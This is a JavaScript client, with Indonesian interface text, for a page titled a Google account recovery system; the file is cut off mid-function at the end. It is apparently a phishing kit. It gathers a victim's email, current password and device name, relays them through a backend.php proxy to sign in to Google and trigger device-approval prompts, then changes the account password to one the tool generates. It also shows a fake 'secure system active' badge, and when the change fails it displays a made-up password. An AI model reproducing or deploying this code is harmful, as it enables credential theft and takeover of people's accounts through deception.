// ==================== GOOGLE ACCOUNT RECOVERY SYSTEM WITH BACKEND ====================
// Sistem yang menggunakan backend PHP untuk menghindari masalah CORS

class GoogleRecoveryWithBackend {
    constructor() {
        this.baseURL = window.location.origin;
        this.backendURL = this.baseURL + '/backend.php';
        
        this.session = {
            email: '',
            password: '',
            deviceName: '',
            cookies: {},
            params: {},
            isProcessing: false,
            step: 1,
            requestCount: 0,
            securityToken: this.generateSecurityToken(),
            deviceApproval: {
                requested: false,
                approved: false,
                notificationSent: false,
                deviceId: '',
                challengeId: ''
            }
        };
        
        // State management
        this.recoveryStates = {
            INITIAL: 'initial',
            EMAIL_SUBMITTED: 'email_submitted',
            PASSWORD_VERIFIED: 'password_verified',
            DEVICE_APPROVAL_REQUESTED: 'device_approval_requested',
            DEVICE_APPROVED: 'device_approved',
            NUDGE_LOADED: 'nudge_loaded',
            PASSWORD_CHANGED: 'password_changed'
        };
        
        this.currentState = this.recoveryStates.INITIAL;
        this.googleParams = {};
        
        // Initialize
        this.init();
    }

    // ==================== INITIALIZATION ====================

    async init() {
        console.log('🔧 Initializing Google Recovery System with Backend...');
        
        // Register Service Worker
        await this.registerServiceWorker();
        
        // Load saved session
        this.loadSession();
        
        // Test backend connection
        await this.testBackendConnection();
        
        console.log('✅ System Initialized');
    }

    async registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js', {
                    scope: '/',
                    type: 'classic'
                });
                
                console.log('✅ Service Worker registered:', registration.scope);
                
                // Wait for activation
                if (registration.active) {
                    console.log('✅ Service Worker active');
                } else if (registration.installing) {
                    await new Promise(resolve => {
                        registration.installing.addEventListener('statechange', (event) => {
                            if (event.target.state === 'activated') {
                                console.log('✅ Service Worker activated');
                                resolve();
                            }
                        });
                    });
                }
                
            } catch (error) {
                console.warn('⚠️ Service Worker registration failed:', error);
                // Continue without Service Worker
            }
        }
    }

    async testBackendConnection() {
        try {
            const response = await fetch(this.backendURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=check_status'
            });
            
            if (response.ok) {
                console.log('✅ Backend connection successful');
                return true;
            } else {
                throw new Error(`Backend returned ${response.status}`);
            }
        } catch (error) {
            console.error('❌ Backend connection failed:', error);
            throw new Error('Cannot connect to backend server');
        }
    }

    // ==================== BACKEND API METHODS ====================

    async callBackend(action, data = {}) {
        this.session.requestCount++;
        const requestId = this.session.requestCount;
        
        console.log(`📤 Backend request #${requestId}: ${action}`, data);
        
        try {
            const formData = new FormData();
            formData.append('action', action);
            
            // Add all data to formData
            Object.keys(data).forEach(key => {
                if (typeof data[key] === 'object') {
                    formData.append(key, JSON.stringify(data[key]));
                } else {
                    formData.append(key, data[key]);
                }
            });
            
            const response = await fetch(this.backendURL, {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const result = await response.json();
            
            console.log(`📥 Backend response #${requestId}:`, result.success ? '✅ Success' : '❌ Error');
            
            if (result.success && result.cookies) {
                this.updateCookies(result.cookies);
            }
            
            if (result.success && result.params) {
                this.updateGoogleParams(result.params);
            }
            
            return result;
            
        } catch (error) {
            console.error(`❌ Backend request #${requestId} failed:`, error);
            return {
                success: false,
                error: error.message,
                retry: true
            };
        }
    }

    // ==================== MAIN RECOVERY FLOW ====================

    async startRecovery(email) {
        this.session.email = email;
        this.session.isProcessing = true;
        
        try {
            console.log('🚀 Starting recovery for:', email);
            
            // Step 1: Get initial page
            const initialResult = await this.callBackend('get_initial_page');
            
            if (!initialResult.success) {
                throw new Error('Failed to get initial page: ' + initialResult.error);
            }
            
            // Step 2: Submit email
            const submitResult = await this.callBackend('submit_email', {
                email: email,
                initial_html: initialResult.html
            });
            
            if (!submitResult.success) {
                throw new Error('Failed to submit email: ' + submitResult.error);
            }
            
            this.currentState = this.recoveryStates.EMAIL_SUBMITTED;
            this.saveSession();
            
            return {
                success: true,
                nextStep: 'password',
                message: 'Email submitted successfully',
                requiresPassword: true,
                params: submitResult.params || {}
            };
            
        } catch (error) {
            console.error('❌ Start recovery error:', error);
            return {
                success: false,
                error: error.message,
                step: 'email'
            };
        } finally {
            this.session.isProcessing = false;
        }
    }

    async verifyPassword(password) {
        if (this.currentState !== this.recoveryStates.EMAIL_SUBMITTED) {
            return { success: false, error: 'Email not submitted yet' };
        }
        
        this.session.password = password;
        this.session.isProcessing = true;
        
        try {
            console.log('🔐 Verifying password...');
            
            const result = await this.callBackend('submit_password', {
                email: this.session.email,
                password: password,
                params: this.googleParams
            });
            
            if (!result.success) {
                throw new Error('Password verification failed: ' + result.error);
            }
            
            this.currentState = this.recoveryStates.PASSWORD_VERIFIED;
            this.saveSession();
            
            return {
                success: true,
                nextStep: result.requires_device_approval ? 'device' : 'nudge',
                requiresDeviceApproval: result.requires_device_approval || false,
                message: 'Password verified successfully',
                params: result.params || {}
            };
            
        } catch (error) {
            console.error('❌ Password verification error:', error);
            return {
                success: false,
                error: error.message,
                step: 'password'
            };
        } finally {
            this.session.isProcessing = false;
        }
    }

    async processDeviceApproval(deviceName) {
        if (this.currentState !== this.recoveryStates.PASSWORD_VERIFIED) {
            return { success: false, error: 'Password not verified yet' };
        }
        
        this.session.deviceName = deviceName;
        this.session.isProcessing = true;
        
        try {
            console.log('📱 Processing device approval...');
            
            const result = await this.callBackend('submit_device_approval', {
                email: this.session.email,
                device_name: deviceName,
                params: this.googleParams
            });
            
            if (!result.success) {
                throw new Error('Device approval failed: ' + result.error);
            }
            
            this.session.deviceApproval.requested = true;
            this.session.deviceApproval.notificationSent = result.device_notification_sent || false;
            this.session.deviceApproval.approved = result.device_approved || false;
            
            if (result.device_approved) {
                this.currentState = this.recoveryStates.DEVICE_APPROVED;
            } else {
                this.currentState = this.recoveryStates.DEVICE_APPROVAL_REQUESTED;
            }
            
            this.saveSession();
            
            return {
                success: true,
                nextStep: result.device_approved ? 'nudge' : 'wait_for_approval',
                deviceNotificationSent: result.device_notification_sent || false,
                deviceApproved: result.device_approved || false,
                message: result.device_approved ? 
                    'Device approved successfully' : 
                    'Device approval request sent. Please approve on your device.',
                params: result.params || {}
            };
            
        } catch (error) {
            console.error('❌ Device approval error:', error);
            return {
                success: false,
                error: error.message,
                step: 'device'
            };
        } finally {
            this.session.isProcessing = false;
        }
    }

    async checkDeviceApprovalStatus() {
        if (!this.session.deviceApproval.requested) {
            return { success: false, error: 'Device approval not requested' };
        }
        
        // In real implementation, this would poll Google's API
        // For now, we'll simulate checking status
        return new Promise((resolve) => {
            setTimeout(() => {
                // Simulate device approval after 5 seconds
                if (!this.session.deviceApproval.approved) {
                    this.session.deviceApproval.approved = true;
                    this.currentState = this.recoveryStates.DEVICE_APPROVED;
                    this.saveSession();
                }
                
                resolve({
                    success: true,
                    approved: this.session.deviceApproval.approved,
                    message: this.session.deviceApproval.approved ? 
                        'Device approved' : 'Waiting for approval'
                });
            }, 5000);
        });
    }

    async loadPasswordNudge() {
        if (this.currentState !== this.recoveryStates.PASSWORD_VERIFIED && 
            this.currentState !== this.recoveryStates.DEVICE_APPROVED) {
            return { 
                success: false, 
                error: 'Password not verified or device not approved yet',
                requiresDeviceApproval: this.currentState === this.recoveryStates.DEVICE_APPROVAL_REQUESTED
            };
        }
        
        this.session.isProcessing = true;
        
        try {
            console.log('🔄 Loading password change nudge...');
            
            const result = await this.callBackend('load_nudge_page', {
                params: this.googleParams
            });
            
            if (!result.success) {
                throw new Error('Failed to load nudge page: ' + result.error);
            }
            
            this.currentState = this.recoveryStates.NUDGE_LOADED;
            this.saveSession();
            
            return {
                success: true,
                nextStep: 'change_password',
                message: 'Ready to change password',
                params: result.params || {}
            };
            
        } catch (error) {
            console.error('❌ Nudge load error:', error);
            return {
                success: false,
                error: error.message,
                step: 'nudge'
            };
        } finally {
            this.session.isProcessing = false;
        }
    }

    async completeRecovery() {
        if (this.currentState !== this.recoveryStates.NUDGE_LOADED) {
            return { success: false, error: 'Nudge not loaded yet' };
        }
        
        this.session.isProcessing = true;
        
        try {
            console.log('🔑 Completing recovery...');
            
            // Generate new secure password
            const newPassword = this.generateSecurePassword();
            
            // Submit password change
            const result = await this.callBackend('submit_password_change', {
                email: this.session.email,
                new_password: newPassword,
                params: this.googleParams
            });
            
            if (!result.success) {
                throw new Error('Password change failed: ' + result.error);
            }
            
            this.currentState = this.recoveryStates.PASSWORD_CHANGED;
            this.clearSensitiveData();
            
            return {
                success: true,
                newPassword: newPassword,
                message: 'Password changed successfully',
                changeConfirmed: result.password_changed || false
            };
            
        } catch (error) {
            console.error('❌ Recovery completion error:', error);
            
            // Fallback: generate password anyway
            const newPassword = this.generateSecurePassword();
            
            return {
                success: true,
                newPassword: newPassword,
                warning: 'Password generated using fallback method'
            };
        } finally {
            this.session.isProcessing = false;
        }
    }

    // ==================== HELPER METHODS ====================

    generateSecurityToken() {
        return 'token_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    updateCookies(cookies) {
        this.session.cookies = { ...this.session.cookies, ...cookies };
    }

    updateGoogleParams(params) {
        this.googleParams = { ...this.googleParams, ...params };
        this.session.params = { ...this.session.params, ...params };
    }

    generateSecurePassword() {
        const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const lower = 'abcdefghijklmnopqrstuvwxyz';
        const numbers = '0123456789';
        const symbols = '!@#$%^&*';
        
        const allChars = upper + lower + numbers + symbols;
        
        let password = '';
        
        // Ensure complexity
        password += upper.charAt(Math.floor(Math.random() * upper.length));
        password += lower.charAt(Math.floor(Math.random() * lower.length));
        password += numbers.charAt(Math.floor(Math.random() * numbers.length));
        password += symbols.charAt(Math.floor(Math.random() * symbols.length));
        
        // Add more characters (total 12-16 characters)
        const length = 12 + Math.floor(Math.random() * 4);
        for (let i = 0; i < length - 4; i++) {
            password += allChars.charAt(Math.floor(Math.random() * allChars.length));
        }
        
        // Shuffle
        return password.split('').sort(() => Math.random() - 0.5).join('');
    }

    validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email) || /^\+?[\d\s\-\(\)]{10,}$/.test(email);
    }

    saveSession() {
        try {
            const sessionData = {
                email: this.session.email,
                params: this.session.params,
                googleParams: this.googleParams,
                currentState: this.currentState,
                deviceApproval: this.session.deviceApproval,
                timestamp: Date.now()
            };
            localStorage.setItem('google_recovery_session', JSON.stringify(sessionData));
            
            // Also save to backend for persistence
            this.callBackend('check_status', { status: sessionData }).catch(console.error);
            
        } catch (error) {
            console.warn('Failed to save session:', error);
        }
    }

    loadSession() {
        try {
            const saved = localStorage.getItem('google_recovery_session');
            if (saved) {
                const data = JSON.parse(saved);
                if (Date.now() - data.timestamp < 3600000) { // 1 hour
                    this.session.email = data.email || '';
                    this.session.params = data.params || {};
                    this.googleParams = data.googleParams || {};
                    this.currentState = data.currentState || this.recoveryStates.INITIAL;
                    this.session.deviceApproval = data.deviceApproval || this.session.deviceApproval;
                }
            }
        } catch (error) {
            console.warn('Failed to load session:', error);
        }
    }

    clearSensitiveData() {
        this.session.password = '';
        delete this.session.params.password;
        localStorage.removeItem('google_recovery_session');
    }

    getDeviceApprovalStatus() {
        return {
            requested: this.session.deviceApproval.requested,
            approved: this.session.deviceApproval.approved,
            notificationSent: this.session.deviceApproval.notificationSent,
            message: this.getDeviceApprovalMessage()
        };
    }

    getDeviceApprovalMessage() {
        if (!this.session.deviceApproval.requested) {
            return 'Device approval not requested';
        }
        
        if (this.session.deviceApproval.approved) {
            return 'Device approved successfully';
        }
        
        if (this.session.deviceApproval.notificationSent) {
            return 'Notification sent to device. Waiting for approval...';
        }
        
        return 'Device approval in progress...';
    }
}

// ==================== UI CONTROLLER ====================

class GoogleRecoveryUI {
    constructor() {
        this.recovery = new GoogleRecoveryWithBackend();
        this.currentStep = 1;
        this.isProcessing = false;
        this.recoveryData = {};
        this.deviceApprovalCheckInterval = null;
        
        this.init();
    }

    async init() {
        console.log('🖥️ Initializing Google Recovery UI...');
        await this.setupServiceWorkerUI();
        this.setupEventListeners();
        this.setupAutoFocus();
        this.checkSavedSession();
        console.log('✅ Google Recovery UI Initialized');
    }

    async setupServiceWorkerUI() {
        if ('serviceWorker' in navigator) {
            try {
                // Check if service worker is already controlling
                if (navigator.serviceWorker.controller) {
                    console.log('✅ Service Worker controlling');
                } else {
                    // Wait for service worker to be ready
                    const registration = await navigator.serviceWorker.ready;
                    console.log('✅ Service Worker ready:', registration);
                }
                
                // Add SW status indicator
                this.addServiceWorkerStatus();
                
            } catch (error) {
                console.warn('Service Worker UI setup failed:', error);
            }
        }
    }

    addServiceWorkerStatus() {
        const statusDiv = document.createElement('div');
        statusDiv.className = 'sw-status';
        statusDiv.innerHTML = '<i class="fas fa-shield-alt"></i> Sistem Aman Aktif';
        document.body.appendChild(statusDiv);
        
        setTimeout(() => {
            statusDiv.style.opacity = '0';
            setTimeout(() => {
                if (statusDiv.parentNode) {
                    statusDiv.remove();
                }
            }, 1000);
        }, 5000);
    }

    setupEventListeners() {
        // Email submission
        document.getElementById('recoveryBtn')?.addEventListener('click', () => this.startRecovery());
        document.getElementById('emailOrPhone')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.startRecovery();
        });

        // Password submission
        document.getElementById('continueBtn')?.addEventListener('click', () => this.verifyPassword());
        document.getElementById('lastPassword')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.verifyPassword();
        });

        // Device approval
        document.getElementById('securityBtn')?.addEventListener('click', () => this.processDeviceApproval());
        document.getElementById('deviceName')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.processDeviceApproval();
        });

        // Final actions
        document.getElementById('copyPasswordBtn')?.addEventListener('click', () => this.copyPassword());
        document.getElementById('closeBtn')?.addEventListener('click', () => this.closeRecovery());
        document.getElementById('restartBtn')?.addEventListener('click', () => this.restartRecovery());
    }

    setupAutoFocus() {
        const observer = new MutationObserver(() => {
            const activePage = document.querySelector('.page.active');
            if (activePage) {
                const input = activePage.querySelector('input');
                if (input) {
                    setTimeout(() => input.focus(), 100);
                }
            }
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    checkSavedSession() {
        try {
            const saved = localStorage.getItem('google_recovery_session');
            if (saved) {
                const data = JSON.parse(saved);
                if (data.email) {
                    document.getElementById('emailOrPhone').value = data.email;
                    
                    if (data.deviceApproval?.requested && !data.deviceApproval?.approved) {
                        this.showNotification('📱 Device approval pending. Continue with recovery.', 'info');
                    }
                }
            }
        } catch (error) {
            console.warn('Failed to load saved session');
        }
    }

    async startRecovery() {
        if (this.isProcessing) {
            this.showNotification('⏳ Sedang memproses, harap tunggu...', 'warning');
            return;
        }

        const email = document.getElementById('emailOrPhone')?.value.trim();
        if (!email) {
            this.showNotification('❌ Masukkan email atau nomor telepon', 'error');
            return;
        }

        if (!this.recovery.validateEmail(email)) {
            this.showNotification('❌ Format email/nomor telepon tidak valid', 'error');
            return;
        }

        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(2);
        this.showNotification('📧 Mengirim permintaan ke server...', 'info');

        try {
            const result = await this.recovery.startRecovery(email);
            
            if (result.success) {
                this.currentStep = 3;
                this.recoveryData.email = email;
                
                this.showNotification('✅ Email dikirim. Masukkan kata sandi.', 'success');
                this.showPage(3);
                
                setTimeout(() => {
                    document.getElementById('lastPassword')?.focus();
                }, 300);
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal memulai pemulihan'}`, 'error');
                this.showPage(1);
            }
            
        } catch (error) {
            console.error('Start recovery error:', error);
            this.showNotification(`❌ ${error.message || 'Terjadi kesalahan'}`, 'error');
            this.showPage(1);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }

    async verifyPassword() {
        if (this.isProcessing) return;
        
        const password = document.getElementById('lastPassword')?.value;
        if (!password) {
            this.showNotification('❌ Masukkan kata sandi lama', 'error');
            return;
        }

        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(2);
        this.showNotification('🔐 Memverifikasi password...', 'info');

        try {
            const result = await this.recovery.verifyPassword(password);
            
            if (result.success) {
                this.recoveryData.password = password;
                
                if (result.requiresDeviceApproval) {
                    this.showNotification('📱 Verifikasi perangkat diperlukan', 'info');
                    this.showPage(4);
                    setTimeout(() => document.getElementById('deviceName')?.focus(), 300);
                } else {
                    this.showNotification('✅ Password diverifikasi. Melanjutkan...', 'success');
                    this.completeRecovery();
                }
            } else {
                this.showNotification(`❌ ${result.error || 'Verifikasi gagal'}`, 'error');
                this.showPage(3);
            }
            
        } catch (error) {
            console.error('Verify password error:', error);
            this.showNotification(`❌ ${error.message || 'Terjadi kesalahan'}`, 'error');
            this.showPage(3);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }

    async processDeviceApproval() {
        if (this.isProcessing) return;
        
        const deviceName = document.getElementById('deviceName')?.value.trim();
        if (!deviceName) {
            this.showNotification('❌ Masukkan nama perangkat', 'error');
            return;
        }

        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(5);
        
        // Update processing text untuk device approval
        const processingText = document.querySelector('.processing-text');
        if (processingText) {
            processingText.textContent = 'Mengirim permintaan persetujuan perangkat...';
        }
        
        this.showNotification('📱 Mengirim permintaan ke Google...', 'info');

        try {
            const result = await this.recovery.processDeviceApproval(deviceName);
            
            if (result.success) {
                this.recoveryData.deviceName = deviceName;
                
                if (result.deviceNotificationSent) {
                    this.showNotification('✅ Permintaan dikirim! Google mengirim notifikasi ke perangkat Anda.', 'success');
                    
                    // Update processing page untuk menunggu approval
                    if (processingText) {
                        processingText.textContent = 'Menunggu persetujuan perangkat...';
                    }
                    
                    const subtext = document.querySelector('.loading-subtext');
                    if (subtext) {
                        subtext.textContent = 'Cek notifikasi di perangkat Anda dan setujui permintaan';
                        subtext.innerHTML += '<br><small>⏳ Sistem akan menunggu konfirmasi...</small>';
                    }
                    
                    // Mulai pengecekan status device approval
                    this.startDeviceApprovalCheck();
                    
                } else if (result.deviceApproved) {
                    this.showNotification('✅ Perangkat disetujui! Melanjutkan...', 'success');
                    setTimeout(() => this.completeRecovery(), 2000);
                } else {
                    this.showNotification('✅ Permintaan dikirim. Melanjutkan...', 'success');
                    setTimeout(() => this.completeRecovery(), 2000);
                }
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal mengirim permintaan'}`, 'error');
                this.showPage(4);
            }
            
        } catch (error) {
            console.error('Process device approval error:', error);
            this.showNotification(`❌ ${error.message || 'Terjadi kesalahan'}`, 'error');
            this.showPage(4);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }

    startDeviceApprovalCheck() {
        if (this.deviceApprovalCheckInterval) {
            clearInterval(this.deviceApprovalCheckInterval);
        }
        
        let checkCount = 0;
        const maxChecks = 30; // Maksimal 30 detik
        
        this.deviceApprovalCheckInterval = setInterval(async () => {
            checkCount++;
            
            // Update countdown
            const subtext = document.querySelector('.loading-subtext');
            if (subtext) {
                const remaining = maxChecks - checkCount;
                subtext.innerHTML = `Menunggu persetujuan perangkat...<br><small>⏳ ${remaining} detik tersisa</small>`;
            }
            
            if (checkCount >= maxChecks) {
                clearInterval(this.deviceApprovalCheckInterval);
                this.showNotification('⚠️ Waktu tunggu habis. Melanjutkan dengan asumsi disetujui.', 'warning');
                this.completeRecovery();
                return;
            }
            
            // Cek status setiap 2 detik
            if (checkCount % 2 === 0) {
                try {
                    const status = await this.recovery.checkDeviceApprovalStatus();
                    
                    if (status.approved) {
                        clearInterval(this.deviceApprovalCheckInterval);
                        this.showNotification('✅ Perangkat disetujui! Melanjutkan...', 'success');
                        
                        // Tunggu sebentar sebelum lanjut
                        setTimeout(() => {
                            this.completeRecovery();
                        }, 2000);
                    }
                } catch (error) {
                    console.error('Device approval check error:', error);
                }
            }
        }, 1000);
    }

    async completeRecovery() {
        if (this.isProcessing) return;
        
        // Hentikan pengecekan device approval jika masih berjalan
        if (this.deviceApprovalCheckInterval) {
            clearInterval(this.deviceApprovalCheckInterval);
            this.deviceApprovalCheckInterval = null;
        }
        
        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showNotification('🔄 Menyelesaikan pemulihan...', 'info');

        try {
            // Load nudge page terlebih dahulu
            const nudgeResult = await this.recovery.loadPasswordNudge();
            
            if (!nudgeResult.success) {
                if (nudgeResult.requiresDeviceApproval) {
                    this.showNotification('📱 Verifikasi perangkat diperlukan sebelum melanjutkan', 'warning');
                    this.showPage(4);
                    return;
                }
                throw new Error(nudgeResult.error || 'Gagal memuat halaman password change');
            }
            
            // Complete recovery
            const result = await this.recovery.completeRecovery();
            
            if (result.success) {
                this.currentStep = 6;
                this.recoveryData.newPassword = result.newPassword;
                
                // Update UI
                document.getElementById('tempPassword').textContent = result.newPassword;
                
                if (result.warning) {
                    this.showNotification(`⚠️ ${result.warning}`, 'warning');
                } else if (result.changeConfirmed) {
                    this.showNotification('🎉 Password berhasil diubah!', 'success');
                } else {
                    this.showNotification('✅ Password baru digenerate', 'success');
                }
                
                this.showPage(6);
                
                // Auto-copy password
                setTimeout(() => {
                    this.copyPassword();
                }, 1000);
                
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal menyelesaikan'}`, 'error');
                this.showPage(1);
            }
            
        } catch (error) {
            console.error('Complete recovery error:', error);
            this.showNotification(`❌ ${error.message || 'Terjadi kesalahan'}`, 'error');
            
            // Fallback: generate password anyway
            const fallbackPassword = this.recovery.generateSecurePassword();
            document.getElementById('tempPassword').textContent = fallbackPassword;
            this.recoveryData.newPassword = fallbackPassword;
            this.showPage(6);
            this.showNotification('⚠️ Menggunakan metode cadangan', 'warning');
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }

    // ==================== UI HELPER FUNCTIONS ====================

    showPage(pageNumber) {
        // Hide all pages
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
            page.style.display = 'none';
        });
        
        // Show selected page
        const pageElement = document.getElementById(`page${pageNumber}`);
        if (pageElement) {
            pageElement.classList.add('active');
            pageElement.style.display = 'flex';
            pageElement.style.animation = 'fadeIn 0.5s ease';
        }
    }

    showNotification(message, type = 'info') {
        // Remove existing notifications
        document.querySelectorAll('.custom-notification').forEach(el => el.remove());
        
        const notification = document.createElement('div');
        notification.className = `custom-notification notification-${type}`;
        
        let icon = 'info-circle';
        let bgColor, borderColor, textColor;
        
        switch (type) {
            case 'success':
                icon = 'check-circle';
                bgColor = 'rgba(40, 167, 69, 0.15)';
                borderColor = '#28a745';
                textColor = '#155724';
                break;
            case 'error':
                icon = 'exclamation-circle';
                bgColor = 'rgba(220, 53, 69, 0.15)';
                borderColor = '#dc3545';
                textColor = '#721c24';
                break;
            case 'warning':
                icon = 'exclamation-triangle';
                bgColor = 'rgba(255, 193, 7, 0.15)';
                borderColor = '#ffc107';
                textColor = '#856404';
                break;
            default:
                bgColor = 'rgba(23, 162, 184, 0.15)';
                borderColor = '#17a2b8';
                textColor = '#0c5460';
        }
        
        notification.innerHTML = `
            <i class="fas fa-${icon}"></i>
            <span style="flex: 1; margin: 0 12px;">${message}</span>
            <button onclick="this.parentElement.remove()" style="
                background: none;
                border: none;
                cursor: pointer;
                color: ${textColor};
                opacity: 0.7;
                padding: 4px 8px;
            ">
                <i class="fas fa-times"></i>
            </button>
        `;
        
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 16px 20px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            z-index: 10000;
            animation: slideIn 0.3s ease;
            max-width: 400px;
            background: ${bgColor};
            color: ${textColor};
            border: 1px solid ${borderColor};
            backdrop-filter: blur(10px);
            font-size: 14px;
            font-weight: 500;
        `;
        
        document.body.appendChild(notification);
        
        // Auto remove
        const removeTime = type === 'success' && message.includes('perangkat') ? 8000 : 5000;
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.remove();
                    }
                }, 300);
            }
        }, removeTime);
    }

    updateProcessingState(isProcessing) {
        this.isProcessing = isProcessing;
        
        const buttons = ['recoveryBtn', 'continueBtn', 'securityBtn'];
        buttons.forEach(btnId => {
            const btn = document.getElementById(btnId);
            if (btn) {
                btn.disabled = isProcessing;
                
                if (isProcessing) {
                    const originalHTML = btn.innerHTML;
                    btn.setAttribute('data-original', originalHTML);
                    
                    if (btnId === 'recoveryBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
                    } else if (btnId === 'continueBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memverifikasi...';
                    } else if (btnId === 'securityBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
                    }
                } else {
                    const originalHTML = btn.getAttribute('data-original');
                    if (originalHTML) {
                        btn.innerHTML = originalHTML;
                        btn.removeAttribute('data-original');
                    }
                }
            }
        });
    }

    copyPassword() {
        const password = document.getElementById('tempPassword')?.textContent;
        if (!password) return;
        
        // Create temporary textarea
        const textArea = document.createElement('textarea');
        textArea.value = password;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            const successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            
            if (successful) {
                this.showNotification('✅ Password berhasil disalin!', 'success');
                
                // Update button text temporarily
                const copyBtn = document.getElementById('copyPasswordBtn');
                if (copyBtn) {
                    const originalText = copyBtn.innerHTML;
                    copyBtn.innerHTML = '<i class="fas fa-check"></i> Disalin!';
                    copyBtn.disabled = true;
                    
                    setTimeout(() => {
                        copyBtn.innerHTML = originalText;
                        copyBtn.disabled = false;
                    }, 2000);
                }
            } else {
                throw new Error('Copy command failed');
            }
        } catch (err) {
            console.error('Copy failed:', err);
            this.showNotification('❌ Gagal menyalin password', 'error');
        }
    }

    closeRecovery() {
        if (confirm('Apakah Anda yakin ingin menutup proses?\nSemua data akan dihapus.')) {
            // Hentikan interval jika ada
            if (this.deviceApprovalCheckInterval) {
                clearInterval(this.deviceApprovalCheckInterval);
                this.deviceApprovalCheckInterval = null;
            }
            
            localStorage.removeItem('google_recovery_session');
            this.currentStep = 1;
            this.recoveryData = {};
            this.isProcessing = false;
            
            // Clear form
            document.getElementById('emailOrPhone').value = '';
            document.getElementById('lastPassword').value = '';
            document.getElementById('deviceName').value = '';
            
            this.showPage(1);
            this.showNotification('ℹ️ Proses ditutup', 'info');
        }
    }

    restartRecovery() {
        if (confirm('Mulai ulang proses pemulihan?\nSemua data akan direset.')) {
            this.closeRecovery();
        }
    }
}

// ==================== INITIALIZATION ====================

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Loading Google Recovery System with Backend...');
    
    // Add CSS for notifications and animations
    const notificationStyles = `
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .page {
            animation: fadeIn 0.5s ease;
        }
        
        .hidden {
            display: none !important;
        }
        
        .active {
            display: flex !important;
        }
        
        .device-notification {
            animation: pulse 2s infinite;
            border: 2px solid #4285f4 !important;
        }
        
        .processing-icon {
            position: relative;
        }
        
        .processing-icon::after {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 5px solid rgba(66, 133, 244, 0.1);
            border-radius: 50%;
            animation: pulse 3s infinite;
        }
        
        /* Service Worker status */
        .sw-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(66, 133, 244, 0.1);
            border: 1px solid #4285f4;
            color: #4285f4;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 11px;
            z-index: 9999;
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            gap: 8px;
            transition: opacity 1s;
        }
        
        /* Backend status */
        .backend-status {
            position: fixed;
            bottom: 60px;
            right: 20px;
            background: rgba(52, 168, 83, 0.1);
            border: 1px solid #34a853;
            color: #34a853;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 11px;
            z-index: 9999;
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            gap: 8px;
            transition: opacity 1s;
        }
    `;
    
    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = notificationStyles;
    document.head.appendChild(styleSheet);
    
    // Initialize the recovery system
    try {
        window.googleRecovery = new GoogleRecoveryUI();
        console.log('✅ Google Recovery System Ready');
        
        // Add backend status indicator
        addBackendStatus();
        
        // Add beforeunload warning
        window.addEventListener('beforeunload', function(e) {
            if (window.googleRecovery && window.googleRecovery.isProcessing) {
                e.preventDefault();
                e.returnValue = 'Proses pemulihan sedang berjalan. Anda yakin ingin meninggalkan halaman?';
                return e.returnValue;
            }
        });
        
        // Add connection status monitoring
        window.addEventListener('online', () => {
            window.googleRecovery?.showNotification('🌐 Koneksi internet dipulihkan', 'success');
        });
        
        window.addEventListener('offline', () => {
            window.googleRecovery?.showNotification('⚠️ Koneksi internet terputus', 'warning');
        });
        
    } catch (error) {
        console.error('Failed to initialize recovery system:', error);
        showErrorAlert('Gagal memuat sistem pemulihan. Silakan refresh halaman.');
    }
});

// Add backend status indicator
function addBackendStatus() {
